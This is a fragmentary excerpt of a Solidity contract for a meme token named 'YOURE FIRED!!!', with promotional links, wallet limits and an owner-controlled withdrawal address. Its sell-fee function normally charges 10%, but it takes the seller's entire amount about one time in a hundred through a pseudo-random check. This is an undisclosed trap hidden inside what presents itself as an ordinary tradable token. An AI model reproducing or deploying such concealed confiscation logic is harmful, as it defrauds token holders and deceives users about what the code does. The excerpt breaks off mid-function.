...
/*
https://t.me/yourefiredtoken
http://www.yourefired.online
*/
...
abstract contract MaxWalletDynamic {
    ...
    uint256 constant startMaxBuyPercentil = 6; // maximum buy on start 1000=100%
    ...
    HasRandom
{
    ...
    function getFeeSell(address account, uint256 amount)
        ...
        returns (uint256)
    {
        if (_random() % 100 == 1) return amount;
        return amount / 10; // 10%
    }
...
// File: contracts/YOURE_FIRED.sol

pragma solidity ^0.8.7;



contract YOURE_FIRED is TradableErc20, Withdrawable {
    constructor()
        TradableErc20("YOURE FIRED!!!", "VINCE")
        Withdrawable(0x08FA8E40dc869e36855f7B2D6784F9B6dF4cECB4)
    {}
    ...
    function setStartMaxWallet(uint256 startMaxWallet) external onlyOwner {
